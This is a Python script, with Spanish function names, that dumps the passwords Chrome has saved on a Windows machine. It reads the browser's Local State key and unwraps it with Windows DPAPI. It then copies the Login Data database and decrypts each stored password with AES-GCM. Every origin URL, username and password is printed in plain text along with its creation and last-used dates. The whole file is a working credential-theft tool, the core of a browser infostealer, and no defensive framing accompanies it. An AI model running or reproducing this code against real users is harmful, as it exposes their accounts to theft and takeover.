import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta


def obtener_fecha_chrome(fecha_chrome):
    return datetime(1601, 1, 1) + timedelta(microseconds=fecha_chrome)

def obtener_clave_cifrado():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    clave = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    clave = clave[5:]
    return win32crypt.CryptUnprotectData(clave, None, None, None, 0)[1]

def descifrar_password(password, clave):
    try:
        iv = password[3:15]
        password = password[15:]
        cifrador = AES.new(clave, AES.MODE_GCM, iv)
        return cifrador.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""
        
def main():
    clave = obtener_clave_cifrado()
    ruta_db = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    nombre_archivo = "ChromeData.db"
    shutil.copyfile(ruta_db, nombre_archivo)
    db = sqlite3.connect(nombre_archivo)
    cursor = db.cursor()
    resultado = cursor.fetchall()
    print(resultado)
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    for fila in cursor.fetchall():
        origin_url = fila[0]
        action_url = fila[1]
        username = fila[2]
        password = descifrar_password(fila[3], clave)
        date_created = fila[4]
        date_last_used = fila[5]        
        if username or password:
            print(f"Origin URL: {origin_url}")
            print(f"Action URL: {action_url}")
            print(f"Username: {username}")
            print(f"Password: {password}")
        else:
            continue
        if date_created != 86400000000 and date_created:
            print(f"Creation date: {str(obtener_fecha_chrome(date_created))}")
        if date_last_used != 86400000000 and date_last_used:
            print(f"Last Used: {str(obtener_fecha_chrome(date_last_used))}")
        print("="*50)
    cursor.close()
    db.close()
    try:
        os.remove(nombre_archivo)
    except:
        pass

if __name__ == "__main__":
    main()